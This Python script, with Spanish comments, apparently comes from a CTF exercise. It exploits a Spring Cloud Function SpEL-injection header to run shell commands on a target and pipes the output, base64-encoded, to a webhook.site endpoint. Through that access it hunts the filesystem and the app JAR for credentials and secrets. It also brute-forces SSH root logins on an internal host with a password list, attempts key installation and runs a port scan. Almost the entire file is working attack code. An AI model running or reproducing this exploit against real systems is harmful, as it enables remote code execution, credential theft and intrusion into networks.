#!/usr/bin/env python3
"""
CTF Chile - Búsqueda sistemática de credenciales SSH
"""
import requests
import time
import base64

TARGET = "http://training-pod2.ctfchile.com:32778"
ROUTER = TARGET + "/functionRouter"

# Crear webhook
print("[*] Creando webhook...")
UUID = requests.post("https://webhook.site/token", timeout=10).json()["uuid"]
WH = "https://webhook.site/" + UUID
print(f"    URL: {WH}")

def probe(tag, cmd):
    shell = f"{cmd} | base64 -w0 | xargs -I X curl -s '{WH}/{tag}?d=X'"
    p = f'T(java.lang.Class).forName("java.lang.Runt"+"ime").getMethod("exe"+"c",new String[]{{}}.getClass()).invoke(T(java.lang.Class).forName("java.lang.Runt"+"ime").getMethod("getRunt"+"ime").invoke(null),new String[]{{"/bin/sh","-c","{shell}"}}).waitFor()'
    try:
        r = requests.post(ROUTER, headers={
            "spring.cloud.function.routing-expression": p,
            "Content-Type": "text/plain",
        }, data="x", timeout=15)
        print(f"    [+] {tag:25} http {r.status_code}")
    except Exception as e:
        print(f"    [!] {tag} error: {e}")

print("[*] Generando claves SSH y buscando credenciales...")

# Generar claves SSH
probe("gen_ssh_keys", "mkdir -p /tmp/ssh && ssh-keygen -t rsa -f /tmp/ssh/id_rsa -N '' -C 'ctf@vault' >/dev/null 2>&1 && echo 'SSH_KEYS_GENERATED'")
probe("show_public_key", "cat /tmp/ssh/id_rsa.pub 2>/dev/null")

print("[*] Buscando archivos de configuración con credenciales...")

# Buscar archivos con credenciales
probe("find_ssh_configs", "find / -name '*ssh*' -type f 2>/dev/null | grep -v proc | head -10")
probe("find_credentials", "find / -name '*credential*' -o -name '*password*' -o -name '*secret*' 2>/dev/null | grep -v proc | head -10")

print("[*] Buscando en archivos de configuración de la aplicación...")

# Examinar archivos de configuración del JAR
probe("extract_and_search", "cd /tmp && rm -rf app_extract && mkdir app_extract && cd app_extract && unzip -q /app/app.jar && find . -name '*.properties' -o -name '*.yml' -o -name '*.yaml' | xargs cat | grep -i 'ssh\\|password\\|key\\|secret\\|10.160' | head -10")

print("[*] Probando credenciales específicas para CTF...")

# Credenciales comunes en CTF
common_passwords = [
    "ctfchile", "omnivault", "vault", "infiltracion", "password", "admin",
    "secret", "flag", "chile", "root", "ubuntu", "debian"
]

for i, password in enumerate(common_passwords[:5]):  # Solo primeras 5
    probe(f"ssh_test_{i+1}", f"timeout 8 sshpass -p '{password}' ssh -o StrictHostKeyChecking=no -o ConnectTimeout=3 root@10.160.209.1 'echo LOGIN_SUCCESS && hostname && id' 2>/dev/null || echo 'AUTH_FAILED_{password}'")

print("[*] Intentando copiar clave pública al host objetivo...")

# Intentar diferentes métodos para copiar la clave
probe("try_ssh_copy", "timeout 5 ssh-copy-id -i /tmp/ssh/id_rsa.pub root@10.160.209.1 2>/dev/null || echo 'SSH_COPY_FAILED'")

print("[*] Explorando otros métodos de acceso...")

# Verificar si hay otros servicios en el host objetivo
probe("port_scan_full", "timeout 10 nmap -p 1-1000 10.160.209.1 2>/dev/null | grep open | head -10")

time.sleep(15)

# Recoger respuestas
print("[*] Recogiendo respuestas...")
r = requests.get(f"https://webhook.site/token/{UUID}/requests?sorting=newest&per_page=25", timeout=10)
data = r.json().get("data", [])

successful_logins = []
ssh_keys = []
credentials_found = []

for req in data:
    url = req.get("url", "")
    path = url.split(f"webhook.site/{UUID}/")[-1].split("?")[0]
    q = req.get("query") or {}
    raw = q.get("d")
    if isinstance(raw, list):
        raw = raw[0] if raw else ""

    print("=" * 60)
    print("TAG:", path)
    if raw:
        try:
            decoded = base64.b64decode(raw).decode("utf-8", "replace")
            print(decoded)

            # Detectar login SSH exitoso
            if "LOGIN_SUCCESS" in decoded:
                successful_logins.append((path, decoded))
                print("🔑 LOGIN SSH EXITOSO!")

            # Detectar claves SSH
            if "ssh-rsa" in decoded or "ssh-ed25519" in decoded:
                ssh_keys.append(decoded)
                print("🔐 CLAVE SSH ENCONTRADA")

            # Detectar credenciales
            if any(keyword in decoded.lower() for keyword in ["password", "secret", "key"]) and len(decoded.strip()) < 200:
                credentials_found.append(decoded)
                print("🔍 POSIBLES CREDENCIALES")

            # Buscar flags
            if "ctfchile{" in decoded.lower():
                print("\n🚩🚩🚩 FLAG ENCONTRADO! 🚩🚩🚩")

        except Exception as e:
            print(f"(decode error) {raw[:150]}")
    else:
        print("(sin payload)")

print(f"\n[*] Manual review: https://webhook.site/#!/{UUID}")

if successful_logins:
    print(f"\n🎉 LOGINS EXITOSOS: {len(successful_logins)}")
if ssh_keys:
    print(f"🔐 CLAVES SSH: {len(ssh_keys)}")
if credentials_found:
    print(f"🔍 CREDENCIALES: {len(credentials_found)}")